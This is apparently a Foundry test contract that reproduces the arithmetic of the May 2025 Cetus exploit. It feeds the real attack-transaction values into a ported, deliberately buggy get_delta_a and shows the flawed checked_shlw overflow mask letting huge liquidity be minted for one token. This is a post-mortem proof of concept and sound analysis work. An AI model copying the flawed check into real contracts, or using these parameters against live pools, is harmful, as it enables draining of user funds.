// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {CetusMath, CetusDeltaA} from "../src/CetusMath.sol";

/// Reproduces the exact arithmetic of the Cetus hack (2025-05-22, ~$223M) using
/// the REAL attack-transaction parameters, ported from the Move source.
contract CetusOverflowTest is Test {
    CetusDeltaA pool;

    // Real values from the actual exploit transaction (per Dedaub / Three Sigma).
    uint128 constant SQRT_P0    = 60_257_519_765_924_248_467_716_150;
    uint128 constant SQRT_P1    = 60_863_087_478_126_617_965_993_239;
    uint128 constant LIQUIDITY  = 10_365_647_984_364_446_732_462_244_378_333_008; // ~2^113

    function setUp() public {
        pool = new CetusDeltaA();
    }

    function test_ReproduceOverflow() public view {
        console2.log("==================================================================");
        console2.log(" Cetus hack reproduction - exact integer_mate::checked_shlw bug");
        console2.log(" Ported from Move; driven by the REAL attack-tx numbers");
        console2.log("==================================================================");
        console2.log("attacker liquidity requested = %s  (~2^113)", LIQUIDITY);
        console2.log("tick range [300000, 300200] -> sqrtP diff = %s", uint256(SQRT_P1) - uint256(SQRT_P0));

        uint256 n = uint256(LIQUIDITY) * (uint256(SQRT_P1) - uint256(SQRT_P0));
        console2.log("");
        console2.log("n = liquidity * sqrtP_diff = %s", n);
        console2.log("2^192                      = %s", uint256(1) << 192);
        console2.log("n >= 2^192 ? %s  (so n<<64 overflows 256 bits)", n >= (uint256(1) << 192));
        console2.log("buggy mask (0xffff..<<192) = %s", uint256(0xffffffffffffffff) << 192);
        console2.log("n > buggy mask ? %s  (false => overflow MISSED)", n > (uint256(0xffffffffffffffff) << 192));

        // The buggy path: overflow is not flagged, numerator wraps to near-zero.
        uint256 deltaA = pool.getDeltaA(SQRT_P0, SQRT_P1, LIQUIDITY, true, false);
        console2.log("");
        console2.log("[BUGGY get_delta_a] token A required = %s", deltaA);
        console2.log("  => attacker minted ~2^113 liquidity for %s token. Then removed", deltaA);
        console2.log("     liquidity across pools to drain ~$223M.");

        assertEq(deltaA, 1, "the overflow makes the required token amount collapse to 1");
    }
}
